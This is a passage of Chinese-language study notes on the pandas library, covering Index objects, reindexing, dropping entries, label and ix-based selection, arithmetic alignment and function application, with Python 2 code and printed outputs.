<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[[ nan  1.5]</span><br><span class="line"> [ 2.4  1.7]</span><br><span class="line"> [ 2.9  3.6]]</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果DF各列数组类型不同，则会选取能兼容所有列的数据类型</p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>索引对象</p>
<ol>
<li><p>负责管理轴标签和其他元数据，构建Series或DF时，所用到的任何数组或其他序列的标签会转换成index</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series(range(<span class="number">3</span>), index = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>])</span><br><span class="line">index = obj.index</span><br><span class="line"><span class="keyword">print</span> index</span><br><span class="line"><span class="keyword">print</span> index[<span class="number">1</span>:]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Index([u&apos;a&apos;, u&apos;b&apos;, u&apos;c&apos;], dtype=&apos;object&apos;)</span><br><span class="line">Index([u&apos;b&apos;, u&apos;c&apos;], dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>index对象不可修改 <span class="tag" tag-name="注意点"><span class="smallcaps">注意点</span>&lt;/span&gt;</span></p>
</li>
<li><p>主要的index对象</p>
<p>|      类         |           说明                                                         |<br>|———————-|——————————————————————————————————|<br>| index         | 最泛化的index对象，将轴标签标示为一个由python对象组成的NumPy数组   |<br>| int64index    | 针对整数的特殊index                                                |<br>| MultiIndex    | “层次化”索引对象，标示单个轴上的多层索引，可以看做由元组组成的数组 |<br>| DatetimeIndex | 存储纳秒级时间戳（用NumPy的datetime64类型标示）                    |<br>| PeriodIndex   | 针对Period数据（时间间隔）的特殊Index                              |<br>|               |                                                                    |</p>
</li>
<li><p>index的方法和属性</p>
<p>|    方法           | 说明                                                   |<br>|———————-|——————————————————————————|<br>| append        | 连接另一个index对象，产生一个新的index             |<br>| diff          | 计算差集，得到一个index                            |<br>| intersection  | 计算交集                                           |<br>| union         | 计算并集                                           |<br>| isin          | 计算一个指示各值是否都包含在参数集合中的布尔型数组 |<br>| delete        | 删除索引i处的元素，并得到一个新的index             |<br>| drop          | 删除传入的值，并得到新的index                      |<br>| insert        | 将元素插入到索引i出，并得到新的index               |<br>| is~monotonic~ | 当各元素均大于前一个元素时，返回True               |<br>| is-unique     | 当index没有重复值时，返回True                      |<br>| unique        | 计算index中的唯一值的数组                          |<br>|               |                                                    |</p>
</li>
</ol>
</li>
<li><p>基本功能</p>
<ol>
<li><p>重新索引 reindex</p>
<ol>
<li><p>从新排序，没有则缺失值，可以用fill~value参数填充缺失值~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series([<span class="number">4.5</span>, <span class="number">7.2</span>, <span class="number">-5.3</span>, <span class="number">3.6</span>], index = [<span class="string">'d'</span>,<span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>])</span><br><span class="line"><span class="keyword">print</span> obj</span><br><span class="line"><span class="comment">#调用reindex将会根据新索引进行重拍，如果索引值不存在，引入缺失值</span></span><br><span class="line">obj2 = obj.reindex([<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>])</span><br><span class="line"><span class="keyword">print</span> obj2</span><br><span class="line"></span><br><span class="line">temp = obj.reindex([<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>],fill_value = <span class="number">0</span>) <span class="comment">#调补缺失值</span></span><br><span class="line"><span class="keyword">print</span> temp</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d    4.5</span><br><span class="line">b    7.2</span><br><span class="line">a   -5.3</span><br><span class="line">c    3.6</span><br><span class="line">dtype: float64</span><br><span class="line">a   -5.3</span><br><span class="line">b    7.2</span><br><span class="line">c    3.6</span><br><span class="line">d    4.5</span><br><span class="line">e    NaN</span><br><span class="line">dtype: float64</span><br><span class="line">a   -5.3</span><br><span class="line">b    7.2</span><br><span class="line">c    3.6</span><br><span class="line">d    4.5</span><br><span class="line">e    0.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>填充</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj3= pd.Series([<span class="string">'blue'</span>,<span class="string">'purpel'</span>,<span class="string">'yellow'</span>],index = [<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> obj3.reindex(range(<span class="number">6</span>), method = <span class="string">'ffill'</span>) <span class="comment">#向前填充</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0      blue</span><br><span class="line">1      blue</span><br><span class="line">2    purpel</span><br><span class="line">3    purpel</span><br><span class="line">4    yellow</span><br><span class="line">5    yellow</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>method选项</p>
<p>|   参数             |     说明                 |<br>|————————|———————————|<br>| ffill或pad     | 前向填充（或搬运）值 |<br>| bfill,backfill | 后向填充（或搬运）值 |<br>|                |                      |</p>
</li>
<li><p>reindex可以修改（行）索引、列或者两者都改，如果仅传入一个序列，则会重新索引行<br><span class="tag" tag-name="注意点"><span class="smallcaps">注意点</span>&lt;/span&gt;</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>,<span class="number">3</span>)),index = [<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>],</span><br><span class="line">columns =[<span class="string">'Ohio'</span>, <span class="string">'Texas'</span>, <span class="string">"California"</span>])</span><br><span class="line"><span class="keyword">print</span> frame</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">frame2 = frame.reindex([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</span><br><span class="line"><span class="keyword">print</span> frame2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用columns关键字可以重新索引列</span></span><br><span class="line">states = [<span class="string">'Texas'</span>, <span class="string">'Utah'</span>, <span class="string">"California"</span>]</span><br><span class="line"><span class="keyword">print</span> frame.reindex(columns = states)</span><br><span class="line"></span><br><span class="line"><span class="comment">#同时对行和列重新索引，而插值则只能按行应用（即轴0）；各行间进行向上补充</span></span><br><span class="line"><span class="keyword">print</span> frame.reindex(index = [<span class="string">'a'</span>,<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>],method = <span class="string">'ffill'</span>, columns = states)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   Ohio  Texas  California</span><br><span class="line">a     0      1           2</span><br><span class="line">c     3      4           5</span><br><span class="line">d     6      7           8</span><br><span class="line"></span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a   0.0    1.0         2.0</span><br><span class="line">b   NaN    NaN         NaN</span><br><span class="line">c   3.0    4.0         5.0</span><br><span class="line">d   6.0    7.0         8.0</span><br><span class="line">   Texas  Utah  California</span><br><span class="line">a      1   NaN           2</span><br><span class="line">c      4   NaN           5</span><br><span class="line">d      7   NaN           8</span><br><span class="line">   Texas  Utah  California</span><br><span class="line">a      1   NaN           2</span><br><span class="line">b      1   NaN           2</span><br><span class="line">c      4   NaN           5</span><br><span class="line">d      7   NaN           8</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用ix的标签索引功能，重新索引任务可以变得更简洁 :ix 不懂:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> frame.ix[[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>], states]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   Texas  Utah  California</span><br><span class="line">a    1.0   NaN         2.0</span><br><span class="line">b    NaN   NaN         NaN</span><br><span class="line">c    4.0   NaN         5.0</span><br><span class="line">d    7.0   NaN         8.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>reindex函数的参数</p>
<p>|      参数       |     说明                                                              |<br>|——————-|—————————————————————————————————-|<br>| index       | 用作索引的新序列。既可以是index的实例，也可以是其他序列的数据结构 |<br>| method      | 插值（填充）方式                                                  |<br>| fill~value~ | 在重新索引过程中，引入缺失值的代替值                              |<br>| limit       | 向前或向后填充时的最大填充量                                      |<br>| level       | 在MultiIndex的指定级别上匹配简单索引，否则选取其子集              |<br>| copy        | 默认为True,如果为False，则新旧相等就不复制                        |<br>|             |                                                                   |</p>
</li>
</ol>
</li>
<li><p>丢弃指定轴上的项</p>
<ol>
<li><p>drap 方法返回删除了的新对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series(np.arange(<span class="number">5.</span>),index = [<span class="string">'a'</span>,<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>])</span><br><span class="line">new_obj = obj.drop(<span class="string">"c"</span>)</span><br><span class="line"><span class="keyword">print</span> new_obj</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj.drop([<span class="string">'d'</span>,<span class="string">'c'</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a    0.0</span><br><span class="line">b    1.0</span><br><span class="line">d    3.0</span><br><span class="line">e    4.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">a    0.0</span><br><span class="line">b    1.0</span><br><span class="line">c    2.0</span><br><span class="line">d    3.0</span><br><span class="line">e    4.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">a    0.0</span><br><span class="line">b    1.0</span><br><span class="line">e    4.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>产出随意轴上的索引值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>), index = [<span class="string">'Ohio'</span>,<span class="string">'Colorado'</span>, <span class="string">"Utah"</span>, <span class="string">'New York'</span>], columns = [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>, <span class="string">'four'</span>])</span><br><span class="line"><span class="keyword">print</span> data.drop([<span class="string">'Colorado'</span>, <span class="string">'Ohio'</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.drop(<span class="string">'two'</span>, axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">          one  two  three  four</span><br><span class="line">Utah        8    9     10    11</span><br><span class="line">New York   12   13     14    15</span><br><span class="line"></span><br><span class="line">          one  three  four</span><br><span class="line">Ohio        0      2     3</span><br><span class="line">Colorado    4      6     7</span><br><span class="line">Utah        8     10    11</span><br><span class="line">New York   12     14    15</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>索引,选取和过滤</p>
<ol>
<li><p>索引可以不是整数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series(np.arange(<span class="number">4</span>),index = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line"><span class="keyword">print</span> obj[<span class="string">'b'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj[[<span class="string">'b'</span>,<span class="string">'a'</span>,<span class="string">'d'</span>]]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj[[<span class="number">1</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj[obj &lt; <span class="number">2</span>] <span class="comment">#注意点，不是bool</span></span><br><span class="line">temp = np.arange(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> temp[temp &lt; <span class="number">2</span>] <span class="comment">#注意点</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">c    2</span><br><span class="line">d    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">b    1</span><br><span class="line">a    0</span><br><span class="line">d    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">b    1</span><br><span class="line">d    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">a    0</span><br><span class="line">b    1</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">[0 1]</span><br></pre></td></tr></table></figure>
</li>
<li><p>用标签的切片，末端是包含的 <span class="tag" tag-name="注意点"><span class="smallcaps">注意点</span>&lt;/span&gt;</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj[<span class="string">'b'</span>:<span class="string">'c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改数值</span></span><br><span class="line">obj[<span class="string">"b"</span>:<span class="string">'c'</span>] = <span class="number">5</span></span><br><span class="line"><span class="keyword">print</span> obj</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b    1</span><br><span class="line">c    2</span><br><span class="line">dtype: int32</span><br><span class="line">a    0</span><br><span class="line">b    5</span><br><span class="line">c    5</span><br><span class="line">d    3</span><br><span class="line">dtype: int32</span><br></pre></td></tr></table></figure>
</li>
<li><p>DF的索引其实是获取一个或多个列 <span class="tag" tag-name="注意点"><span class="smallcaps">注意点</span>&lt;/span&gt;</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>),</span><br><span class="line">                      index= [<span class="string">'Ohio'</span>,<span class="string">'Colorado'</span>,<span class="string">'Utah'</span>,<span class="string">'New York'</span>],</span><br><span class="line">                      columns = [<span class="string">'one'</span>, <span class="string">'two'</span>,<span class="string">'three'</span>,<span class="string">'four'</span>])</span><br><span class="line">  <span class="keyword">print</span> data</span><br><span class="line">  <span class="keyword">print</span></span><br><span class="line">  <span class="keyword">print</span> data[<span class="string">'two'</span>]</span><br><span class="line">  <span class="keyword">print</span> data[[<span class="string">'three'</span>,<span class="string">'one'</span>]]</span><br><span class="line"></span><br><span class="line">  <span class="comment">#切片来索引</span></span><br><span class="line">  <span class="keyword">print</span> data[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment">#bool数组来选取</span></span><br><span class="line">  <span class="keyword">print</span> data[data[<span class="string">"three"</span>] &gt; <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">          one  two  three  four</span><br><span class="line">Ohio        0    1      2     3</span><br><span class="line">Colorado    4    5      6     7</span><br><span class="line">Utah        8    9     10    11</span><br><span class="line">New York   12   13     14    15</span><br><span class="line"></span><br><span class="line">Ohio         1</span><br><span class="line">Colorado     5</span><br><span class="line">Utah         9</span><br><span class="line">New York    13</span><br><span class="line">Name: two, dtype: int32</span><br><span class="line">          three  one</span><br><span class="line">Ohio          2    0</span><br><span class="line">Colorado      6    4</span><br><span class="line">Utah         10    8</span><br><span class="line">New York     14   12</span><br><span class="line">          one  two  three  four</span><br><span class="line">Ohio        0    1      2     3</span><br><span class="line">Colorado    4    5      6     7</span><br><span class="line">          one  two  three  four</span><br><span class="line">Colorado    4    5      6     7</span><br><span class="line">Utah        8    9     10    11</span><br><span class="line">New York   12   13     14    15</span><br></pre></td></tr></table></figure>
<ol>
<li><p>ix 标签索引（行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> data.ix[<span class="string">"Colorado"</span>, [<span class="string">"two"</span>, <span class="string">"three"</span>]]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.ix[[<span class="string">"colorado"</span>, <span class="string">"utah"</span>], [<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.ix[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.ix[data.three &gt;<span class="number">5</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">two      5</span><br><span class="line">three    6</span><br><span class="line">Name: Colorado, dtype: int32</span><br><span class="line"></span><br><span class="line">          four  one  two</span><br><span class="line">colorado   NaN  NaN  NaN</span><br><span class="line">utah       NaN  NaN  NaN</span><br><span class="line"></span><br><span class="line">one       8</span><br><span class="line">two       9</span><br><span class="line">three    10</span><br><span class="line">four     11</span><br><span class="line">Name: Utah, dtype: int32</span><br><span class="line"></span><br><span class="line">Colorado     7</span><br><span class="line">Utah        11</span><br><span class="line">New York    15</span><br><span class="line">Name: four, dtype: int32</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>DF索引说明</p>
<p>|            类型               |     说明                                       |<br>|—————————————-|——————————————————————|<br>| obj[val]                | 选取DF的单列或者一组列                     |<br>| obj.ix[val]             | 选取DF的单个行或者一组行                   |<br>| obj.ix[:,val]           | 选取单个列或列子集                         |<br>| obj.ix[val1,val2]       | 同时选取行和列                             |<br>| reindex方法               | 将一个或多个轴匹配或重新索引               |<br>| xs方法                    | 港剧标签选取单行或单列，返回一个Series     |<br>| icol,irow方法             | 根据整数未知选取单列或单行，返回一个Series |<br>| get~value~,set~value方法~ | 根据行或列标签选取单个值                   |<br>|                           |                                            |</p>
</li>
</ol>
</li>
<li><p>算术运算和数据对齐</p>
<ol>
<li><p>如果存在不同的索引对，则结果是并集，缺失则为NA值</p>
</li>
<li><p>在算术方法中填填充</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">df1 = pd.DataFrame(np.arange(<span class="number">12.</span>).reshape((<span class="number">3</span>,<span class="number">4</span>)),columns = list(<span class="string">'abcd'</span>))</span><br><span class="line">df2 = pd.DataFrame(np.arange(<span class="number">20.</span>).reshape((<span class="number">4</span>,<span class="number">5</span>)),columns = list(<span class="string">'abcde'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"df1"</span></span><br><span class="line"><span class="keyword">print</span> df1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"df2"</span></span><br><span class="line"><span class="keyword">print</span> df2</span><br><span class="line"><span class="keyword">print</span> df1 + df2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#填写缺失值</span></span><br><span class="line"><span class="keyword">print</span> df1.add(df2,fill_value = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>部分算术方法</p>
<p>|   方法   |  说明    |<br>|———|———|<br>| add  | +   |<br>| sub  | -   |<br>| div  | /    |<br>| mul  | *   |</p>
</li>
<li><p>DF和Series之间的运算（会广播）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"arr"</span></span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span> arr - arr[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#DF和Serise之间</span></span><br><span class="line">frame = pd.DataFrame(np.arange(<span class="number">12</span>).reshape(<span class="number">4</span>,<span class="number">3</span>),</span><br><span class="line">                     columns = list(<span class="string">'abc'</span>),index = [<span class="string">'Utah'</span>, <span class="string">'Ohio'</span>, <span class="string">'Texas'</span>, <span class="string">'Oregon'</span>])</span><br><span class="line">series = frame.ix[<span class="number">0</span>]</span><br><span class="line">series1 = frame[<span class="string">'a'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"DF:frame"</span></span><br><span class="line"><span class="keyword">print</span> frame</span><br><span class="line"><span class="keyword">print</span> <span class="string">"series"</span></span><br><span class="line"><span class="keyword">print</span> series</span><br><span class="line"><span class="keyword">print</span> frame - series</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> series1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment"># 列相减不成功</span></span><br><span class="line"><span class="keyword">print</span> frame - series1</span><br></pre></td></tr></table></figure>
<ol>
<li><p>用运算方法来处理匹配列的运算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#继续上面</span></span><br><span class="line"><span class="keyword">print</span> frame.sub(series1,axis = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>函数应用和映射</p>
<ol>
<li><p>Numpy的ufuncs（元素级数组方法）可用于操作pandas对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.random.randn(<span class="number">4</span>,<span class="number">3</span>),columns = list(<span class="string">'bde'</span>),</span><br><span class="line">                  index = [<span class="string">'Utah'</span>, <span class="string">'Ohio'</span>, <span class="string">'Texas'</span>, <span class="string">'Oregon'</span>])</span><br><span class="line"><span class="keyword">print</span> frame</span><br><span class="line"><span class="keyword">print</span> np.abs(frame)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DF的apply方法来实现函数功能</span></span><br><span class="line">f = <span class="keyword">lambda</span> x: x.max() - x.min()</span><br><span class="line"><span class="keyword">print</span> frame.apply(f)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> frame.apply(f, axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>改变格式(格式化字符串) applymap</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">format = <span class="keyword">lambda</span> x: <span class="string">'%.2f'</span> % x</span><br><span class="line"><span class="keyword">print</span> frame.applymap(format)</span><br></pre></td></tr></table></figure>
<ol>
<li><p>单列运算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> frame[<span class="string">'e'</span>].map(format)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>排序和排名</p>
<ol>
